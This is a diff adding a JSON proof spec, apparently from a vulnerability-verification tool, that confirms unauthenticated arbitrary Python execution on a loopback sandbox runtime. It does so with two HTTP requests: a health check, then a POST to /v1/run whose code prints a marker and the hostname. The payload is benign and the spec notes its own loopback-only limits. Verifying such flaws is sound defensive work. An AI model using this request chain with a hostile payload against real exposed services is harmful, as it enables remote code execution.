@@ -1,0 +1,22 @@
+{
+  "schemaVersion": "1.0.0",
+  "id": "v-httpchain-asr-chain",
+  "title": "http_chain proof: health-gated arbitrary Python exec on sandbox-runtime",
+  "claim": "An unauthenticated 2-step chain (health check then code exec) confirms arbitrary Python execution on 127.0.0.1:8001.",
+  "family": "http_chain",
+  "soundness": "sound",
+  "ceiling": "Loopback-only; does not establish remote exploitability (host must be on 0.0.0.0 for a remote attacker).",
+  "isolation": "loopback",
+  "cost": { "budget": "2 requests", "gated": true, "timeoutMs": 10000 },
+  "base": "http://127.0.0.1:8001",
+  "oracle": {
+    "mode": "steps",
+    "steps": [
+      { "request": { "method": "GET", "path": "/health" }, "expect": "200", "save": "health" },
+      { "request": { "method": "POST", "path": "/v1/run", "body": { "value": "import socket; print('__ASR_RCE_VERIFY_91f7c3__'); print(socket.gethostname())" } }, "expect": "200", "save": "run" }
+    ],
+    "evidence": "__ASR_RCE_VERIFY_91f7c3__ in {run.body.stdout}",
+    "markers": { "health_ok": "step0.expect_ok", "exec_ok": "evidence" }
+  },
+  "pass": { "mode": "chain" }
+}
